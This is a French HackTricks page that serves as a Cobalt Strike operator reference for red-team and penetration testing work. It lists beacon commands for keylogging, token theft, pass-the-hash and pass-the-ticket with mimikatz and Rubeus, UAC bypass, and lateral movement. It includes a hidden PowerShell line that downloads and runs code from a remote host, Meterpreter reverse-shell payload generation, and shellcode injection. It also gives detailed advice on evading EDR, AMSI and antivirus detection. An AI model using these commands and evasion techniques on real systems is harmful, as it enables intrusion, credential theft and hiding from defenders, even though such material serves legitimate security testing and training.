# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` vous pouvez ensuite sélectionner où écouter, quel type de beacon utiliser (http, dns, smb...) et plus encore.

### Peer2Peer Listeners

Les beacons de ces listeners n'ont pas besoin de communiquer directement avec le C2 ; ils peuvent communiquer avec lui via d'autres beacons.

`Cobalt Strike -> Listeners -> Add/Edit` vous devez ensuite sélectionner les beacons TCP ou SMB

* Le **TCP beacon définira un listener sur le port sélectionné**. Pour vous connecter à un TCP beacon, utilisez la commande `connect <ip> <port>` depuis un autre beacon
* Le **smb beacon écoutera sur un pipename portant le nom sélectionné**. Pour vous connecter à un SMB beacon, vous devez utiliser la commande `link [target] [pipe]`.

### Générer et héberger des payloads

#### Générer des payloads dans des fichiers

`Attacks -> Packages ->`

* **`HTMLApplication`** pour les fichiers HTA
* **`MS Office Macro`** pour un document Office contenant une macro
* **`Windows Executable`** pour un fichier .exe, .dll ou un service .exe
* **`Windows Executable (S)`** pour un fichier .exe, .dll ou un service .exe **stageless** (stageless est préférable à staged, car il génère moins d'IoCs)

#### Générer et héberger des payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Cela générera un script/exécutable pour télécharger le beacon depuis Cobalt Strike dans des formats tels que : bitsadmin, exe, powershell et python

#### Héberger des payloads

Si vous disposez déjà du fichier que vous souhaitez héberger sur un serveur web, allez simplement dans `Attacks -> Web Drive-by -> Host File`, puis sélectionnez le fichier à héberger et la configuration du serveur web.

### Options du Beacon

<details>
<summary>Options et commandes du Beacon</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Implants personnalisés / Linux Beacons

- Un agent personnalisé doit seulement parler le protocole HTTP/S du Cobalt Strike Team Server (profil C2 malleable par défaut) pour s'enregistrer/effectuer son check-in et recevoir des tâches. Implémentez les mêmes URI/en-têtes/chiffrement des métadonnées définis dans le profil afin de réutiliser l'interface de Cobalt Strike pour l'envoi des tâches et la récupération des résultats.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Un Aggressor Script (par ex. `CustomBeacon.cna`) peut encapsuler la génération du payload pour le beacon non-Windows afin que les opérateurs puissent sélectionner le listener et produire directement des payloads ELF depuis l'interface graphique.
- Exemples de gestionnaires de tâches Linux exposés au Team Server : `sleep`, `cd`, `pwd`, `shell` (exécuter des commandes arbitraires), `ls`, `upload`, `download` et `exit`. Ils correspondent aux identifiants de tâches attendus par le Team Server et doivent être implémentés côté serveur pour renvoyer les résultats au format approprié.
- La prise en charge des BOF sous Linux peut être ajoutée en chargeant des Beacon Object Files en mémoire, dans le processus, avec [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (qui prend également en charge les BOF de type Outflank), ce qui permet d'exécuter une post-exploitation modulaire dans le contexte et avec les privilèges de l'implant sans créer de nouveaux processus.<sup>[[2]](#references)[[3]](#references)</sup>
- Intégrez un gestionnaire SOCKS dans le beacon personnalisé afin de conserver une parité de pivotement avec les Windows Beacons : lorsque l'opérateur exécute `socks <port>`, l'implant doit ouvrir un proxy local pour acheminer les outils de l'opérateur via l'hôte Linux compromis vers les réseaux internes.

## Opsec

### Execute-Assembly

La commande **`execute-assembly`** utilise un **processus sacrificiel** au moyen d'une injection dans un processus distant pour exécuter le programme indiqué. Cette technique est très bruyante, car l'injection dans un processus utilise certaines API Windows surveillées par tous les EDR. Cependant, certains outils personnalisés peuvent être utilisés pour charger un élément dans le même processus :

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Dans Cobalt Strike, vous pouvez également utiliser des BOF (Beacon Object Files) : [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

L'Aggressor Script `https://github.com/outflanknl/HelpColor` crée la commande `helpx` dans Cobalt Strike, qui ajoute des couleurs aux commandes pour indiquer s'il s'agit de BOF (vert), de Frok&Run (jaune) ou d'éléments similaires, ou de ProcessExecution, d'injection ou d'éléments similaires (rouge). Cela permet de savoir quelles commandes sont les plus furtives.

### Agir comme l'utilisateur

Vous pouvez vérifier des événements tels que `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` :

- Security EID 4624 - Vérifiez toutes les connexions interactives afin de connaître les heures habituelles d'activité.
- System EID 12,13 - Vérifiez la fréquence des arrêts/démarrages/mises en veille.
- Security EID 4624/4625 - Vérifiez les tentatives NTLM entrantes valides/invalides.
- Security EID 4648 - Cet événement est créé lorsque des identifiants en clair sont utilisés pour se connecter. S'il a été généré par un processus, le binaire contient potentiellement les identifiants en clair dans un fichier de configuration ou dans le code.

Lorsque vous utilisez `jump` depuis Cobalt Strike, il est préférable d'utiliser la méthode `wmi_msbuild` afin que le nouveau processus paraisse plus légitime.

### Utiliser des comptes d'ordinateur

Il est courant que les défenseurs vérifient les comportements inhabituels générés par les utilisateurs et **excluent les comptes de service et les comptes d'ordinateur tels que `*$` de leur surveillance**. Vous pouvez utiliser ces comptes pour effectuer des mouvements latéraux ou une élévation de privilèges.

### Utiliser des payloads stageless

Les payloads stageless sont moins bruyants que les payloads staged, car ils n'ont pas besoin de télécharger une seconde étape depuis le serveur C2. Cela signifie qu'ils ne génèrent aucun trafic réseau après la connexion initiale, ce qui les rend moins susceptibles d'être détectés par les défenses basées sur le réseau.

### Tokens & Token Store

Soyez prudent lorsque vous volez ou générez des tokens, car un EDR peut énumérer les tokens de thread et détecter un **token appartenant à un autre utilisateur**, voire à SYSTEM, à l'intérieur du processus.

Cela permet de stocker les tokens **par beacon**, afin de ne pas avoir à voler plusieurs fois le même token. C'est utile pour les mouvements latéraux ou lorsque vous devez utiliser plusieurs fois un token volé :

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Lors d'un mouvement latéral, il est généralement préférable de **voler un token plutôt que d'en générer un nouveau** ou d'effectuer une attaque pass the hash.

### Guardrails

Cobalt Strike dispose d'une fonctionnalité appelée **Guardrails**, qui contribue à empêcher l'utilisation de certaines commandes ou actions susceptibles d'être détectées par les défenseurs. Les Guardrails peuvent être configurés pour bloquer certaines commandes, telles que `make_token`, `jump`, `remote-exec` et d'autres commandes couramment utilisées pour les mouvements latéraux ou l'élévation de privilèges.

De plus, le dépôt [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) contient également certaines vérifications et idées à envisager avant d'exécuter un payload.

### Chiffrement des tickets

Dans un environnement AD, soyez prudent avec le chiffrement des tickets. Par défaut, certains outils utilisent le chiffrement RC4 pour les tickets Kerberos, qui est moins sécurisé que le chiffrement AES, et les environnements à jour utilisent par défaut AES. Cela peut être détecté par les défenseurs qui surveillent les algorithmes de chiffrement faibles.

### Éviter les valeurs par défaut

Lors de l'utilisation de Cobalt Strike, les pipes SMB s'appellent par défaut `msagent_####` et `"status_####"`. Modifiez ces noms. Il est possible de vérifier les noms des pipes existants depuis Cobalt Strike avec la commande : `ls \\.\pipe\`

De plus, avec les sessions SSH, un pipe appelé `\\.\pipe\postex_ssh_####` est créé. Modifiez-le avec `set ssh_pipename "<new_name>";`.

De même, lors d'une attaque de post-exploitation, les pipes `\\.\pipe\postex_####` peuvent être modifiés avec `set pipename "<new_name>"`.

Dans les profils Cobalt Strike, vous pouvez également modifier des éléments tels que :

- Éviter d'utiliser `rwx`
- Le fonctionnement de l'injection de processus (les API utilisées) dans le bloc `process-inject {...}`
- Le fonctionnement de "fork and run" dans le bloc `post-ex {…}`
- Le délai de sleep
- La taille maximale des binaires à charger en mémoire
- L'empreinte mémoire et le contenu de la DLL avec le bloc `stage {...}`
- Le trafic réseau

### Contourner le memory scanning

Certains EDR analysent la mémoire à la recherche de signatures connues de malware. Cobalt Strike permet de modifier la fonction `sleep_mask` en tant que BOF, ce qui permet de chiffrer le backdoor en mémoire.

### Injections de processus bruyantes

L'injection de code dans un processus est généralement très bruyante, car **aucun processus normal n'effectue habituellement cette action et les méthodes permettant de le faire sont très limitées**. Elle peut donc être détectée par des systèmes de détection basés sur le comportement. De plus, elle peut être détectée par des EDR qui analysent le réseau à la recherche de **threads contenant du code qui n'est pas présent sur le disque** (bien que des processus tels que les navigateurs utilisant le JIT présentent couramment ce comportement). Exemple : [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | Relations PID et PPID

Lors de la création d'un nouveau processus, il est important de **conserver une relation parent-enfant normale** entre les processus afin d'éviter la détection. Si svchost.exe exécute iexplorer.exe, cela paraîtra suspect, car svchost.exe n'est normalement pas le parent d'iexplorer.exe dans un environnement Windows standard.

Lorsqu'un nouveau beacon est généré dans Cobalt Strike, un processus utilisant **`rundll32.exe`** est créé par défaut pour exécuter le nouveau listener. Ce n'est pas très furtif et peut être facilement détecté par les EDR. De plus, `rundll32.exe` est exécuté sans aucun argument, ce qui le rend encore plus suspect.

Avec la commande Cobalt Strike suivante, vous pouvez spécifier un autre processus pour générer le nouveau beacon, le rendant ainsi moins détectable :
```bash
spawnto x86 svchost.exe
```
Vous pouvez également modifier ce paramètre **`spawnto_x86` et `spawnto_x64`** dans un profile.

### Proxying attackers traffic

Les attackers auront parfois besoin de pouvoir exécuter des tools localement, même sur des machines Linux, et faire parvenir le traffic des victims jusqu'au tool (par ex. NTLM relay).

De plus, pour effectuer une attaque pass-the.hash ou pass-the-ticket, il est parfois plus furtif pour l'attacker **d'ajouter ce hash ou ce ticket dans son propre processus LSASS** localement, puis de pivoter à partir de celui-ci plutôt que de modifier un processus LSASS sur une machine victim.

Cependant, vous devez être **prudent avec le traffic généré**, car vous pourriez envoyer un traffic inhabituel (Kerberos ?) depuis votre processus backdoor. Pour cela, vous pouvez pivoter vers un processus de navigateur (bien que vous puissiez être détecté en vous injectant dans un processus ; réfléchissez donc à une manière furtive de procéder).


### Éviter les AV

#### AV/AMSI/ETW Bypass

Consultez la page :


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Généralement, dans `/opt/cobaltstrike/artifact-kit`, vous pouvez trouver le code et les templates précompilés (dans `/src-common`) des payloads que Cobalt Strike va utiliser pour générer les binary beacons.

En utilisant [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) avec la backdoor générée (ou simplement avec le template compilé), vous pouvez trouver ce qui déclenche Defender. Il s'agit généralement d'une string. Vous pouvez donc simplement modifier le code qui génère la backdoor afin que cette string n'apparaisse pas dans le binary final.

Après avoir modifié le code, exécutez simplement `./build.sh` depuis le même répertoire, puis copiez le dossier `dist-pipe/` sur le client Windows, dans `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
N'oubliez pas de charger le script agressif `dist-pipe\artifact.cna` pour indiquer à Cobalt Strike d'utiliser les ressources du disque que nous voulons, et non celles qui sont chargées.

#### Resource Kit

Le dossier ResourceKit contient les templates pour les payloads basés sur des scripts de Cobalt Strike, notamment PowerShell, VBA et HTA.

En utilisant [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) avec les templates, vous pouvez déterminer ce que le defender (AMSI dans ce cas) n'apprécie pas et le modifier :
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
En modifiant les lignes détectées, on peut générer un template qui ne sera pas détecté.

N'oubliez pas de charger le script agressif `ResourceKit\resources.cna` afin d'indiquer à Cobalt Strike d'utiliser les ressources du disque que nous voulons, et non celles qui sont déjà chargées.

#### Function hooks | Syscall

Le hooking de fonctions est une méthode très courante utilisée par les EDR pour détecter les activités malveillantes. Cobalt Strike permet de contourner ces hooks en utilisant des **syscalls** au lieu des appels d'API Windows standard avec la configuration **`None`**, d'utiliser la version **`Nt*`** d'une fonction avec le paramètre **`Direct`**, ou simplement de sauter par-dessus la fonction **`Nt*`** avec l'option **`Indirect`** dans le profil malleable. Selon le système, une option peut être plus furtive qu'une autre.

Cela peut être configuré dans le profil ou à l'aide de la commande **`syscall-method`**.

Cependant, cela peut également être bruyant.

Une des options offertes par Cobalt Strike pour contourner les hooks de fonctions consiste à supprimer ces hooks avec : [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Vous pouvez également vérifier quelles fonctions sont hookées avec [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) ou [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Commandes diverses de Cobalt Strike</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## References

- [1] [Cobalt Strike Linux Beacon (PoC d’implant personnalisé)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [ELFLoader et Linux BOFs de TrustedSec](https://github.com/trustedsec/ELFLoader)
- [3] [Modèle de BOF nix d’Outflank](https://github.com/outflanknl/nix_bof_template)
- [4] [Analyse par Unit42 du chiffrement des métadonnées de Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Journal du SANS ISC sur le trafic de Cobalt Strike](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
{{#include ../banners/hacktricks-training.md}}
